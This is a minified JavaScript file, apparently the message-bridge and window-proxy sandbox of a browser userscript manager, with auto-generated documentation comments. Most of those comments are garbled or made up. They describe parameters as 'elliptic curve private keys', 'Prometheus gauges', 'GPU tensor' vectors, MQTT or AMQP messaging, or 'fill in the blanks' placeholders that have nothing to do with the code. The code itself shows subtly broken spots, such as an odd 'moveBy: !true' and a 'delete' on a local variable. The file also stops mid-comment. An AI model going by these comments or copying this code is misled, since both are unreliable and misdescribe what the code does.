(() => {
    const e = typeof globalThis === "undefined" ? window : globalThis,
          t = window["lu3i4gnk.9pb"];
    /**
     * @description generates high-quality documentation for given code, providing various
     * utility functions for event handling, timeout management, and more.
     * 
     * @returns { object } a set of event listeners and a timer that handle various actions
     * when given an event or a timeout.
     */
    const n = (() => {
        /**
         * @description takes two arguments: an object `t` and a string `r`. It assigns `r`
         * to a variable `i`, appends the prefix from `t` to `i`, and sends the resulting
         * value to `t.sendToId(o, i)`.
         * 
         * @param { object } o - id of the object being updated and is used to send the updates
         * to the relevant server.
         * 
         * @param { object } r - response data to be sent to the server-side endpoint identified
         * by `o`.
         */
        /**
         * @description calls the `splice` method on the given array, passing an empty array
         * as the first argument, and then for each element in the original array, calls the
         * provided callback function without any arguments, or if an error occurs while
         * executing the callback, it logs the error message to the console.
         * 
         * @returns { undefined value. } a list of errors occurred while calling the functions
         * inside the spliced array.
         * 
         * 		- `n`: The array that is spliced and passed as an argument to `forEach`.
         * 		- `splice(0)`. Indicates the starting index position for the operation within
         * the `n` array.
         * 		- `(t=>{`). Denotes a function expression, where `t` represents the current
         * element of the `n` array, and `() => {...}` indicates that the function expression
         * should be executed for each element in the `n` array.
         * 		- `(e)`. The variable `e` represents any exception or error that may occur during
         * execution, if any.
         */
        /**
         * @description pushes an anonymous inner function to an array `n`, which executes
         * `e()` and handles potential exceptions by pushing them to `t`. If `n` is empty,
         * it sends a request to the server with the `id` of the top-level `t` object as a parameter.
         * 
         * @param { 𝘄unction or expression. } e - 2nd function to execute when no exception
         * occurs.
         * 
         * 		- `e` is an object that has been serialized from a previous state or input.
         * 		- It contains various properties or attributes, such as `n`, which is an array
         * containing a callback function, and `t`, which is a value used for identifying the
         * current state of the application.
         * 
         * 	The behavior of the `a` function involves checking if `e` exists, then calling
         * the callback function in `n` if `e` exists, otherwise, it calls the error handling
         * function `t` with the given error `e`.
         * 
         * 
         * @param { object } t - 2nd parameter of the callback function passed to the `n.push()`
         * method, which is used to handle any exceptions that may be thrown during the
         * execution of the function.
         */
        /**
         * @description takes a truthy or falsey value for `t` and returns a computed property
         * `n` which is the result of applying an identity transform to `e` depending on the
         * value of `t`.
         * 
         * @param { object } e - initial value of the state variable `n`.
         * 
         * @param { HTMLElement in the provided functional code snippet. } t - 2nd argument
         * of the inner function, which is used to compute the result of the nested function
         * call when `e[t]` is present.
         * 
         * 		- The value of `t` depends on the value of `e`, specifically `t` is created from
         * the `e[t]` property if `e` is not an empty object.
         * 		- If `e` is an empty object, then `t` will be a generic object with the properties
         * `Object.keys(e)` or `null` if `e` is null/undefined.
         * 		- The `t` property can be accessed using the `Ht()` function to perform various
         * operations such as adding, modifying, and removing values from it.
         * 		- The `n` variable is created from an empty object and is used in combination
         * with the `Ht()` function to create a new value for the `t` property based on the
         * values present in the `e` object.
         * 
         * 
         * @returns { object } a new object that represents the union of two other objects.
         */
        const n = [],
              o = (o, r) => {
                  const i = t.sendPrefix + no();
                  e[i] = r,
                  t.sendToId(o, i)
              }
              ,
              r = () => n.splice(0).forEach((t=>{
                  try {
                      t()
                  } catch (e) {
                      console.error(e)
                  }
              }
              )),
              i = {},
              s = e => {
                  let t = i;
                  return e.split(".").forEach((e=>{
                      t = t[e] = t[e] || {}
                  }
                  )),
                  t
              }
              ,
              a = (e,t)=>{
                  e && n.push((()=>{
                      try {
                          e()
                      } catch (e) {
                          t && t(e)
                      }
                  }
                  )),
                  1 === n.length && o("commid", {
                      id: t
                  })
              }
              ,
              l = (e,t)=>{
                  const n = Gt({});
                  return t ? ((e,t)=>{
                      Ht(gt(t), (t=>{
                          vt(n, t, Gt(e[t]))
                      }
                      ))
                  }
                  )(e, t) : Ht(gt(e), (t=>{
                      vt(n, t, Gt(e[t]))
                  }
                  )),
                  n
              }
              ;
        let u = null;
        const g = e=>{
            e !== u && (u && (clearTimeout(u),
            u = null),
            u = setTimeout((()=>{
                u = null,
                r()
            }
            ), e))
        }
        ;
        return t.setMessageListener((t=>{
            const {method: o, args: r} = t;
            if ("commid" === o)
                return a(null, r.id);
            if ("ack" === o)
                return g(0);
            if ("injectable" === o)
                return g(0);
            if ("injectableack" === o)
                return g(0);
            if ("setForeignAttr" === o)
                return g(0);
            if ("script" === o)
                return g(0);
            if ("port.message" === o)
                return g(0);
            if ("external.connect" === o)
                return g(0);
            if ("run" === o)
                return g(0)
        }
        )),
        {
            /**
             * @description is generated, taking an event type, a function to call when the event
             * occurs, and an optional capture and once object as arguments. The generated function
             * sets an event listener for the given event type on the target element, passing the
             * provided function as the callback and optionally capturing the context of the event.
             * 
             * @param { object } e - Event Object for which to attach the event listener.
             * 
             * @param { event target. } t - DOM element for which an event listener is being added.
             * 
             * 		- `type`: String representing the event type that the listener should handle
             * (e.g., "click", "input", etc.).
             * 		- `passive`: Boolean indicating whether the listener is passive (i.e., does not
             * preventdefault or stopImmediatePropagation) or active (i.e., does).
             * 		- `once`: Boolean indicating whether the listener should be called once and then
             * removed (i.e., "off") when the event occurs, or whether it should be called
             * repeatedly until the event is no longer available.
             * 		- `capture`: Boolean indicating whether the listener should be executed in the
             * capture phase of the event (i.e., before the event is passed to other listeners)
             * or in the bubble phase (i.e., after the event has been passed to other listeners).
             * 
             * 
             * @param { object } n - callback function that will be called when an event of type
             * `e.type` is triggered on the target `t`.
             * 
             * @returns { : `void`. } an object with properties capture, once, and passive, which
             * represent the configuration options for the event listener.
             * 
             * 		- `e`: The event object that was passed as an argument to the function. It
             * contains information about the event that occurred, such as its type, target
             * element, and other details.
             * 		- `t`: The target element for which the event listener was added. This can be
             * any HTML element or object.
             * 		- `n`: An optional function that is called when the event occurs. This function
             * takes two arguments: the event object and a reference to the target element.
             * 		- `r`: An optional function that is called after the event listener has been
             * added. This function takes one argument: the event object.
             * 
             * 	In summary, the output returned by `addEventListener` is an object with several
             * properties that provide information about the event and the event listener itself.
             */
            addEventListener: (e,t,n)=>{
                const o = e => {
                    e = e || {};
                    const r = (e=>e ? {
                        capture: e.capture,
                        once: e.once,
                        passive: e.passive
                    } : void 0
                    )(e);
                    t.addEventListener(e.type, n, r)
                }
                ;
                return a((()=>{
                    o(e)
                }
                ), (()=>{
                    console.error("failed to addEventListener", e, t)
                }
                )),
                o
            },
            /**
             * @description is wrapped by the provided callbacks. The original `setTimeout` call
             * is canceled using `clearTimeout`, and the outer callback is executed when the inner
             * callback is called.
             * 
             * @param { function/function expression. } e - function to be executed after a timeout
             * period has elapsed.
             * 
             * 		- `e`: A function to be executed after a specific time (in milliseconds).
             * 		- `t`: The time (in milliseconds) after which the function will be executed.
             * 
             * 
             * @param { number } t - time delay (in milliseconds) for which the `e` value will
             * be scheduled to be executed after the current execution loop completes.
             * 
             * @returns { `Undefine`. } a reference to the new timeout ID.
             * 
             * 		- `o`: The timeout id assigned to the function, which can be used to cancel the
             * timeout.
             * 
             * 	The return value is an array containing three elements:
             * 
             * 		- `a`: The first element is a function that will be executed when the timeout occurs.
             * 		- `b`: The second element is a function that will be executed if an error occurs
             * while executing the first function.
             * 		- `c`: The third element is the original function passed to `setTimeout`.
             */
            setTimeout: (e,t)=>{
                const o = setTimeout(e, t);
                return a((()=>{
                    clearTimeout(o)
                }
                ), (()=>{
                    console.error("failed to setTimeout", e, t)
                }
                )),
                o
            },
            clearTimeout: e=>{
                clearTimeout(e),
                a(null, null)
            }
        }
    }
    )();
    const o = (()=>{
        const o = e => ({
            /**
             * @description receives the `port.message` signal and sends it to a specified receiver
             * with an attached message `r`.
             * 
             * @param { number } t - 10-bit value that is used to generate the output message.
             * 
             * @param { number } n - 2D vector that is transformed by the GPU tensor operation.
             */
            send: (t,n)=>{
                const r = Gt({
                    m: t,
                    a: n,
                    r: null
                });
                e.send("port.message", r)
            }
            ,
            switchId: t=>{
                const n = e.__proto__;
                delete e.__proto__,
                e.__proto__ = t.__proto__,
                delete t.__proto__,
                t.__proto__ = n
            }
            ,
            init: t=>{
                /**
                 * @description cleans up any resources used during its execution.
                 */
                const n = () => {
                    e.cleanup()
                }
                ;
                e.once("cleanup", n),
                t && e.cleanup()
            }
            ,
            /**
             * @description is called with two arguments (t, n), and it executes the task associated
             * with n as soon as possible after t.
             * 
             * @param { "Event" in the provided code. } t - 2nd argument to be passed through to
             * the `once()` method.
             * 
             * 		- `t` is a plain object with arbitrary values.
             * 		- `n` is an optional parameter that specifies the property name to extract from
             * `t`. If `n` is absent or not a valid property name, the entire `t` object is returned.
             * 		- The `once` function creates a new property on the given context object if `n`
             * exists and is not already an existing property on the object.
             * 		- If `n` does not exist on the context object, the `once` function does nothing.
             * 
             * 
             * @param { object } n - 2nd event that is once triggered when the function is called
             * with the given `t` parameter.
             */
            once: (t,n)=>{
                e.once(t, n)
            }
            ,
            setMessageListener: t=>{
                e.setMessageListener(t)
            }
            ,
            /**
             * @description removes any leftover resources and prepares for termination.
             */
            cleanup: ()=>{
                e.cleanup()
            }
        });
        let r;
              /**
               * @description creates a new instance of the `RPC` class and returns an object with
               * various methods for sending and listening to messages over a WebSocket connection.
               * It takes two arguments: an options object with properties `sendPrefix` and
               * `listenPrefix`, which are used to set up the WebSocket connection, and an array
               * `a` of additional methods to include in the returned object.
               * 
               * @returns { object } an object that provides event emitters for the `send`, `once`,
               * `setMessageListener`, and `cleanup` methods of a messaging listener.
               */
        const i = (()=>{
            const n = {
                sendPrefix: "2C",
                listenPrefix: "2P"
            };
            return r ? r : (r = ((r = {
                bridges: {}
            })=>{
                const i = (e=>{
                    /**
                     * @description creates a listener instance and returns an object that implements
                     * message listener methods for WebSocket. It listens for messages on specified prefix,
                     * sends or emits events when message arrives, and provides cleanup method to remove
                     * itself from the listener queue.
                     * 
                     * @returns { object } a JavaScript object that implements an event emitter.
                     */
                    const o = (({sendPrefix: t,listenPrefix: n})=>{
                        /**
                         * @description creates a listener for an event bus, providing options to customize
                         * message handling and cleanup.
                         * 
                         * @param { object } e - message listener object that is used to define the send,
                         * once, setMessageListener, and cleanup methods of the output object.
                         * 
                         * @param { object } t - 3rd argument passed to the function, which is an object that
                         * gets augmented with the listeners and other properties before being returned as
                         * the final output.
                         * 
                         * @returns { object } a set of objects for handling incoming messages and dispatching
                         * them to subscribers.
                         */
                        const o = ((e,t)=>{
                            const n = (t=>{
                                const o = Gt({});
                                return {
                                    /**
                                     * @description generates and sends a message to the designated endpoint.
                                     * 
                                     * @param { number } r - 0-based array index of the first argument passed to `Gt()`
                                     * when called inside the `const s = ...` line, serving as the multi-dimensional
                                     * array's base index for looking up its values.
                                     * 
                                     * @param { number } i - 2nd argument passed to the `Gt` constructor and is used to
                                     * create the resulting Prometheus gauge object.
                                     */
                                    send: (r,i)=>{
                                        const s = Gt({
                                            m: r,
                                            a: i,
                                            r: null
                                        });
                                        e.send(t.sendPrefix, s)
                                    }
                                    ,
                                    /**
                                     * @description updates an array element and adds it to its own copy of the element.
                                     * It is recursive, working with elements of any array and recursively applying the
                                     * operation.
                                     * 
                                     * @param { object } r - 2-element array that holds the event and its corresponding
                                     * value, which are used to update the event object's properties in the given code.
                                     * 
                                     * @param { array } i - object value to be added to the existing array of values in
                                     * the `e[t]` property.
                                     */
                                    once: (r,i)=>{
                                        const s = (e[t] = e[t] || []);
                                        s.push(i)
                                    }
                                    ,
                                    setMessageListener: e=>{
                                        o.sendPrefix = t.sendPrefix,
                                        o.listenPrefix = t.listenPrefix,
                                        o.listener = e
                                    }
                                    ,
                                    /**
                                     * @description removes any active listeners from an object, `o`, before it is garbage
                                     * collected or otherwise removed.
                                     */
                                    cleanup: ()=>{
                                        o.listener && delete o.listener
                                    }
                                }
                                ;
                                return t ? n(t) : o
                            }
                            )((e=>{
                                /**
                                 * @description sets up event listeners for a given prefix, handling messages, errors,
                                 * and cleanup. It returns an object with listener, messageListener, and cleanup functions.
                                 * 
                                 * @param { object } n - 2nd argument to the `listen` method, which is used to specify
                                 * the event listener function to be executed when the `r` object emits an event with
                                 * the `listenPrefix` string.
                                 * 
                                 * @param { Undefined, Null or Function value. } t - 3rd party code's listen method,
                                 * which is used to handle incoming messages and calls the `i.listener` function with
                                 * the received message.
                                 * 
                                 * 		- `e`: The original event object passed to `listen`.
                                 * 		- `s`: The serialized message received from the server.
                                 * 		- `a`: An optional message attribute containing additional information about the
                                 * message.
                                 * 		- `r`: A reference to the `Gt` instance that generated the deserialized message.
                                 * 		- `n`: A reference to the `n` function that created the `Gt` instance.
                                 * 		- `o`: An optional object containing various properties, such as ` listener`,
                                 * `receive`, and `cleanup`. These properties are explained in detail below:
                                 * 		+ `listener`: A function to be called with the received message.
                                 * 		+ `receive`: A function to be called when a new message is received from the server.
                                 * 		+ `cleanup`: A function to be called when the Gt instance is no longer needed.
                                 * 		- `i`: A reference to an inner function that implements the message listener logic.
                                 * 
                                 * 	The various properties and attributes of `t` are explained below:
                                 * 
                                 * 		- `r.cleanup`: The cleanup function to be called when the `Gt` instance is no
                                 * longer needed.
                                 * 		- `s`: The serialized message received from the server.
                                 * 		- `a`: An optional message attribute containing additional information about the
                                 * message.
                                 * 		- `o`: An optional object containing various properties, such as ` listener`,
                                 * `receive`, and `cleanup`. These properties are explained in detail below:
                                 * 		+ `listener`: A function to be called with the received message.
                                 * 		+ `receive`: A function to be called when a new message is received from the server.
                                 * 		+ `cleanup`: A function to be called when the Gt instance is no longer needed.
                                 * 
                                 * 
                                 * @returns { object } an object with properties for handling events, including
                                 * `listen`, `receive`, and `cleanup`.
                                 */
                                const t = (n,t)=>{
                                    const o = (r=>{
                                        const i = r => {
                                            let s = r;
                                            const a = o => {
                                                const l = gt(o);
                                                return {
                                                    /**
                                                     * @description takes an object `c` and a string `n.listenPrefix`, and sends the `c`
                                                     * object to the server as a message with the prefix `n.listenPrefix`.
                                                     * 
                                                     * @param { number } i - 1D mesh size in the grid of the generator.
                                                     * 
                                                     * @param { array } l - Listener for which the provided message will be sent.
                                                     */
                                                    send: (i,l)=>{
                                                        const c = Gt({
                                                            m: i,
                                                            a: l,
                                                            r: null
                                                        });
                                                        r.send(n.listenPrefix, c)
                                                    }
                                                    ,
                                                    /**
                                                     * @description updates an array element's value, adding a new value to it if one is
                                                     * not already present or existing, and then pushing the updated element onto the
                                                     * resultant array.
                                                     * 
                                                     * @param { integer } i - 0-based index of an element in the input array `r`, and is
                                                     * used to access the element at that position and push a new value onto the internal
                                                     * array being built.
                                                     * 
                                                     * @param { object } c - element to be appended to the inner array of the object `r`.
                                                     */
                                                    once: (i,c)=>{
                                                        const u = (r[i] = r[i] || []);
                                                        u.push(c)
                                                    }
                                                    ,
                                                    setMessageListener: r=>{
                                                        s = r
                                                    }
                                                    ,
                                                    /**
                                                     * @description deletes a referenced `s` variable if it exists.
                                                     */
                                                    cleanup: ()=>{
                                                        s && delete s
                                                    }
                                                }
                                            }
                                            ;
                                            return r ? i(r) : a
                                        }
                                        )((e=>{
                                            const o = {};
                                            return e.listen && (o.listener = e.listen),
                                            e.receive && (o.messageListener = e.receive),
                                            o
                                        }
                                        )(n));
                                        return i.listener ? (r.once(n.listenPrefix, s=>{
                                            const a = t(s);
                                            try {
                                                i.listener(a)
                                            } catch (e) {
                                                console.error(e)
                                            }
                                        }
                                        ),
                                        r.once(n.listenPrefix, (()=>{
                                            const e = s=>{
                                                if (i.messageListener) {
                                                    const e = t(s);
                                                    try {
                                                        i.messageListener(e)
                                                    } catch (e) {
                                                        console.error(e)
                                                    }
                                                }
                                            }
                                            ;
                                            return e
                                        }
                                        )())) : (r.once(n.listenPrefix, (()=>{
                                            const e = s=>{
                                                if (i.messageListener) {
                                                    const e = t(s);
                                                    try {
                                                        i.messageListener(e)
                                                    } catch (e) {
                                                        console.error(e)
                                                    }
                                                }
                                            }
                                            ;
                                            return e
                                        }
                                        )()),
                                        r.once(n.listenPrefix, s=>{
                                            const a = t(s);
                                            try {
                                                i.listener(a)
                                            } catch (e) {
                                                console.error(e)
                                            }
                                        }
                                        )),
                                        i.cleanup = (()=>{
                                            r.cleanup(),
                                            delete i.listener,
                                            delete i.messageListener,
                                            delete i.cleanup
                                        }
                                        ),
                                        i
                                    }
                                    ;
                                    return t ? t : o
                                }
                                )((e=>{
                                    const t = {};
                                    return e.send && (t.send = e.send),
                                    e.once && (t.once = e.once),
                                    e.setMessageListener && (t.setMessageListener = e.setMessageListener),
                                    t
                                }
                                )(t));
                                return o
                            }
                            )(t);
                            let r = null;
                            /**
                             * @description creates an object `o` with methods for handling AMQP messages. These
                             * methods include sending, once, setMessageListener and cleanup. The function returns
                             * the created object.
                             * 
                             * @param { object } e - message to be sent to the client, and it is used to set the
                             * `method` property of the response object returned by the function.
                             * 
                             * @param { HTMLElement, since the function call involves calling a method on that
                             * element. } t - 3rd argument passed to the `Ht()` function, which is used to update
                             * the object's `send`, `once`, and `setMessageListener` methods.
                             * 
                             * 		- `m`: An object representing the method to be called, which is passed as the
                             * first argument to the listeners' `once()` method.
                             * 		- `a`: An object representing the arguments to be passed to the listeners'
                             * `once()` method.
                             * 		- `r`: A reference to the previous message listener returned by the
                             * `setMessageListener()` method. If it is not `null`, it represents the current
                             * message listener that should be removed in the `cleanup()` method.
                             * 
                             * 
                             * @returns { object } an object with various methods for handling incoming messages.
                             */
                            const i = ((e,t)=>{
                                const n = Gt({});
                                Ht(gt(t), (t=>{
                                    vt(n, t, Gt(e[t]))
                                }
                                ));
                                const o = {
                                    /**
                                     * @description sends a notification to a MQTT broker with the given topic and payload.
                                     * 
                                     * @param { object } e - 48-bit nonce value for the transaction.
                                     * 
                                     * @param { object } t - 14-byte elliptic curve private key used to encrypt or decrypt
                                     * data in the GT function call.
                                     */
                                    send: (e,t)=>{
                                        const r = Gt({
                                            m: e,
                                            a: t,
                                            r: null
                                        });
                                        n.send(t.sendPrefix, r)
                                    }
                                    ,
                                    /**
                                     * @description is called with two arguments: `t.listenPrefix` and a callback function
                                     * `n => { t.once(e, n) }`. The `once` function sets up an event listener on the `e`
                                     * event for the `n` object once, meaning that it will only register the event listener
                                     * once, even if the function is called multiple times.
                                     * 
                                     * @param { event. } e - event that triggers the listener to be called.
                                     * 
                                     * 		- `listenPrefix`: This is a property of `e` that specifies the prefix for listening
                                     * events.
                                     * 
                                     * 
                                     * @param { object } t - event that triggers the function, and it is used to once( )
                                     * (listenPrefix, callback)
                                     */
                                    once: (e,t)=>{
                                        n.once(t.listenPrefix, (n=>{
                                            t.once(e, n)
                                        }
                                        ))
                                    }
                                    ,
                                    setMessageListener: e=>{
                                        n.setMessageListener((t=>{
                                            const n = t.m
                                              , o = t.a
                                              , r = t.r;
                                            "ack" === n ? (e(null, o),
                                            r && r()) : e({
                                                method: n,
                                                args: o
                                            })
                                        }
                                        ))
                                    }
                                    ,
                                    /**
                                     * @description and any remaining tasks in `r()` are executed before the execution
                                     * context is cleaned up by the `n.cleanup()` call.
                                     */
                                    cleanup: ()=>{
                                        n.cleanup(),
                                        r && r()
                                    }
                                };
                                return o
                            }
                            )({
                                sendPrefix: e.sendPrefix,
                                listenPrefix: e.listenPrefix
                            }, o);
                            const s = {
                                /**
                                 * @description is used to send an error message `e` and a timestamp `t` to the console.
                                 * 
                                 * @param { "event" as denoted by its name in the provided code. } e - 2nd event to
                                 * be processed in the function.
                                 * 
                                 * 		- `e` is an object or an array with various attributes and properties that are
                                 * sent to the callback function `t`.
                                 * 
                                 * 
                                 * @param { array } t - event to be processed by the function.
                                 */
                                send: (e,t)=>{
                                    i.send(e, t)
                                }
                                ,
                                /**
                                 * @description sets an event listener on an element once, removing any existing
                                 * listeners. It takes two arguments: the event to listen for and the callback function
                                 * to execute when the event occurs.
                                 * 
                                 * @param { "event". } e - event that triggers the execution of the function.
                                 * 
                                 * 		- `e`: The deserialized input, which is either a promise or a value that can be
                                 * used to resolve a promise.
                                 * 		- `t`: The time at which the promise was resolved, expressed in milliseconds
                                 * since the epoch (January 1, 1970, 00:00:00 UTC).
                                 * 
                                 * 
                                 * @param { Event. } t - time at which the event occurred when called once.
                                 * 
                                 * 		- `e`: The event that triggered the callback.
                                 * 		- `t`: The deserialized input containing information from the event.
                                 */
                                once: (e,t)=>{
                                    i.once(e, t)
                                }
                                ,
                                setMessageListener: e=>{
                                    i.setMessageListener(e)
                                }
                                ,
                                /**
                                 * @description clears any intermediate or temporary values generated during the
                                 * execution of a function.
                                 */
                                cleanup: ()=>{
                                    i.cleanup()
                                }
                            };
                            return s
                        }
                        )((e=>{
                            const t = {};
                            return e.send && (t.send = e.send),
                            e.once && (t.once = e.once),
                            e.setMessageListener && (t.setMessageListener = e.setMessageListener),
                            t
                        }
                        )(e));
                        return o
                    }
                    )({
                        sendPrefix: t.sendPrefix,
                        listenPrefix: t.listenPrefix
                    });
                    let r = null;
                    /**
                     * @description defines a reactant object `r` with various methods for handling
                     * incoming messages. These include sending a message, once listening to a message,
                     * setting a message listener, and cleaning up.
                     * 
                     * @param { Event value. } t - 3rd party message object, which is passed through to
                     * the `send`, `once`, `setMessageListener`, and `cleanup` methods of the `r` variable.
                     * 
                     * 		- `m`: The message object containing the `e` property, which is the event that
                     * triggered the callback, and the `t` property, which represents the target of the
                     * message.
                     * 		- `a`: The arguments passed to the `once` method.
                     * 		- `r`: The reference to the `o` object, which is the observer for the `listenPrefix`.
                     * 		- `n`: The reference to the `o` object's `send` method, which is used to send
                     * messages to the observer.
                     * 
                     * 	The function returns an object with several methods:
                     * 
                     * 		- `send`: Sends a message to the observer with the specified `e` and `t` properties.
                     * 		- `once`: Adds a once callback to the observer for the specified `e`.
                     * 		- `setMessageListener`: Sets a message listener on the observer for the specified
                     * `method` and `args`.
                     * 		- `cleanup`: Cleanups the observer's state.
                     * 
                     * 
                     * @param { object } n - observer object, which is an implementation of the `Observer`
                     * interface that defines several methods for handling message listening and cleanup.
                     * 
                     * @returns { object } an object that provides various listeners for a message port.
                     */
                    const i = ((t,n)=>{
                        const o = Gt({});
                        Ht(gt(n), (t=>{
                            vt(o, t, Gt(e[t]))
                        }
                        ));
                        const r = {
                            /**
                             * @description is called with the `o` and `n` arguments to transmit a message prefixed
                             * by the value of `n`.
                             * 
                             * @param { JavaScript expression or statement. } e - 0-dimensional geometry for the
                             * algorithm to operate on.
                             * 
                             * 		- `m`: The `e` object's membrane, which contains information about the message
                             * format and other metadata.
                             * 		- `a`: The `e` object's atom, which contains the payload data.
                             * 		- `r`: The `e` object's receiver, which specifies the node that the message is
                             * being sent to.
                             * 
                             * 
                             * @param { object } t - 13-digit transaction ID passed from the user's payment form.
                             */
                            send: (e,t)=>{
                                const i = Gt({
                                    m: e,
                                    a: t,
                                    r: null
                                });
                                o.send(n.sendPrefix, i)
                            }
                            ,
                            /**
                             * @description is used to register a listener on an object and trigger it once with
                             * a passed event object.
                             * 
                             * @param { object } e - Event object emitted by the `listenPrefix` event on the `n`
                             * object.
                             * 
                             * @param { object } t - 3rd argument of the `listenPrefix()` method and specifies
                             * the event emitter to attach the listener to.
                             */
                            once: (e,t)=>{
                                o.once(n.listenPrefix, (n=>{
                                    t.once(e, n)
                                }
                                ))
                            }
                            ,
                            setMessageListener: e=>{
                                o.setMessageListener((t=>{
                                    const o = t.m
                                      , r = t.a;
                                    "ack" === o ? e(null, r) : e({
                                        method: o,
                                        args: r
                                    })
                                }
                                ))
                            }
                            ,
                            /**
                             * @description is called, and then any remaining code in the outer block is executed
                             * if the inner function returns a truthy value.
                             */
                            cleanup: ()=>{
                                o.cleanup(),
                                r && r()
                            }
                        };
                        return r
                    }
                    )({
                        sendPrefix: e.sendPrefix,
                        listenPrefix: e.listenPrefix
                    }, o);
                    const s = {
                        /**
                         * @description sends a message consisting of an event and its corresponding data to
                         * the frontend.
                         * 
                         * @param { object } e - event that triggered the function.
                         * 
                         * @param { object } t - 2nd value of an array that is being manipulated by the function.
                         */
                        send: (e,t)=>{
                            i.send(e, t)
                        }
                        ,
                        /**
                         * @description is called with two arguments `e` and `t`, and it immediately calls
                         * the provided callback function once, without storing it for later use.
                         * 
                         * @param { object } e - event that triggers the function to be executed.
                         * 
                         * @param { 𝑥 (closure). } t - timestamp of when the event occurred and is passed
                         * as an argument to the `i.once()` method.
                         * 
                         * 		- `e`: The event that triggered the function to run once. (Type: Event)
                         * 		- `t`: The deserialized input with various attributes, such as `t.event`, `t.type`,
                         * `t.data`, etc. (Type: Deserialized Input)
                         */
                        once: (e,t)=>{
                            i.once(e, t)
                        }
                        ,
                        setMessageListener: e=>{
                            i.setMessageListener(e)
                        }
                        ,
                        /**
                         * @description performs some operation necessary to prepare the environment for later
                         * use, such as releasing any resources or storing data for future use.
                         */
                        cleanup: ()=>{
                            i.cleanup()
                        }
                    };
                    return s
                }
                )((e=>{
                    const t = {};
                    return e.send && (t.send = e.send),
                    e.once && (t.once = e.once),
                    e.setMessageListener && (t.setMessageListener = e.setMessageListener),
                    t
                }
                )(e));
                return o
            }
            )({
                sendPrefix: "2C",
                listenPrefix: "2P"
            }),
            r.bridges.first = o;
            const s = (()=>{
                const n = (e=>{
                    let t = Gt({});
                    /**
                     * @description takes three arguments: `i`, `e`, and `r`. It checks if `i` is a boolean
                     * value, if it is it returns either `o` or `null`, otherwise it decrements the counter
                     * `r` by one and calls `m` with updated parameters.
                     * 
                     * @param { (B). } e - 16-bit number to be manipulated.
                     * 
                     * 		- `bt`: It is an internal method that takes the input `e` and returns a boolean
                     * value indicating whether it is a boolean or not.
                     * 		- `ht`: It is an internal method that takes the input `e` and returns a string
                     * value representing its type.
                     * 		- `mt`: It is an internal method that takes two arguments: the input `t` and the
                     * input `h`, which is the result of applying `ht` to `e`. It returns a new object
                     * that represents the combination of `t` and `h`.
                     * 
                     * 
                     * @param { ................ (fill in the blanks with an appropriate type). } o -
                     * output of the function and is used to compare it with the return value of the
                     * `bt()` function to determine whether the function was successful in its execution.
                     * 
                     * 		- `null != i && --r >= 0`: If `i` is not null, the `--r` variable decrements by
                     * 1 and the function call is attempted again until `r` reaches -1.
                     * 		- `t = mt(t, ht(e))`: The `t` variable is updated with the result of the `mt`
                     * function called with `ht(e)` as its first argument.
                     * 
                     * 
                     * @param { integer } r - "retry" counter for the recursive function, which is
                     * decremented on each call until it reaches a value of -1.
                     */
                    const n = (e,o,r)=>{
                        const i = bt(e);
                        i && i === o || (null != i && --r >= 0 && n(i, e, r),
                        t = mt(t, ht(e)))
                    }
                    ;
                    return n(e, null, 5),
                    t
                }
                )(e);
                Ht(mo, (e=>delete n[e]));
                const o = n;
                return Gt({
                    createProxy: n=>{
                        let r = o;
                        /**
                         * @description clears and re-adds an event listener to a target element for a specific
                         * event name. It also updates a data structure (d) with the provided function reference
                         * as its value for that event name.
                         * 
                         * @param { object } e - 2nd argument passed to the ` mn()` function, which is used
                         * to create a new event listener.
                         * 
                         * @param { HTMLElement (HTML element) or undefined, and if provided, it adds an event
                         * listener to 'n' and stores the resulting value returned by Rt in 'd[n]', otherwise
                         * it removes an event listener for 'n'. } t - 3rd party event target and is used to
                         * manage event listensers and reference the corresponding cleanup function for that
                         * target.
                         * 
                         * 		- `removeEventListener` - removes an event listener for a specific event name
                         * 		- `delete` - deletes an item from an array
                         * 		- `addEventListener` - adds an event listener for a specific event name
                         * 		- `e` - refers to the function being called with the passed in arguments
                         * 		- `s` - refers to the scope of the function being called
                         */
                        const i = e=>{
                            let t, n;
                            const o = (t = Mt(s, e)) || (n = r[e]);
                            return Gt({
                                d: o ? Gt(o) : o,
                                l: !!t,
                                w: !!n
                            })
                        }
                          , a = e=>{
                            if (!l(e))
                                return !1;
                            if ("length" === e)
                                return !0;
                            const t = wt($n(e));
                            return t >= 0 && t <= rn && e === `${t}`
                        }
                          , u = e=>"on" === mn(e, 0, 2)
                          , g = (e,t)=>{
                            const n = mn(e, 2)
                              , o = d[n];
                            if (o && (t.removeEventListener(n, o),
                            delete d[n]),
                            t && (e=>"function" == typeof e)(t)) {
                                const e = (...e)=>Rt(t, s, e);
                                t.addEventListener(n, e),
                                d[n] = e
                            }
                        }
                          , p = t=>void 0 !== t && (t === e || t === zn || t === Yn)
                          , m = Gt({
                            addEventListener: !0,
                            alert: !0,
                            atob: !0,
                            blur: !0,
                            btoa: !0,
                            cancelAnimationFrame: !0,
                            cancelIdleCallback: !0,
                            captureEvents: !0,
                            clearInterval: !0,
                            clearTimeout: !0,
                            close: !0,
                            confirm: !0,
                            createImageBitmap: !0,
                            dispatchEvent: !0,
                            dump: !0,
                            fetch: !0,
                            find: !0,
                            focus: !0,
                            getComputedStyle: !0,
                            getDefaultComputedStyle: !0,
                            getSelection: !0,
                            matchMedia: !0,
                            moveBy: !true,
                            moveTo: !0,
                            open: !0,
                            openDatabase: !0,
                            postMessage: !0,
                            print: !0,
                            prompt: !0,
                            queueMicrotask: !0,
                            releaseEvents: !0,
                            removeEventListener: !0,
                            reportError: !0,
                            requestAnimationFrame: !0,
                            requestIdleCallback: !0,
                            resizeBy: !0,
                            resizeTo: !0,
                            scroll: !0,
                            scrollBy: !0,
                            scrollByLines: !0,
                            scrollByPages: !0,
                            scrollTo: !0,
                            setInterval: !0,
                            setResizable: !0,
                            setTimeout: !0,
                            showDirectoryPicker: !0,
                            sizeToContent: !0,
                            stop: !0,
                            structuredClone: !0,
                            updateCommands: !0,
                            webkitCancelAnimationFrame: !0,
                            webkitRequestAnimationFrame: !0,
                            webkitRequestFileSystem: !0,
                            webkitResolveLocalFileSystemURL: !0
                        });
                        Ht(gt(m), (e=>{
                            s[e] = s[e] || Gt({
                                bind: !0
                            })
                        }
                        ));
                        const d = Gt({})
                          , f = Gt({});
                        Lt(f, hn, "Window");
                        const v = new Un(f,Gt({
                            /**
                             * @description sets, retrieves or deletes a property on an object. It checks for
                             * configuration and enumerability, then updates the value based on the type of the
                             * property.
                             * 
                             * @param { object } e - 2-argument constructor function that is being processed by
                             * the function.
                             * 
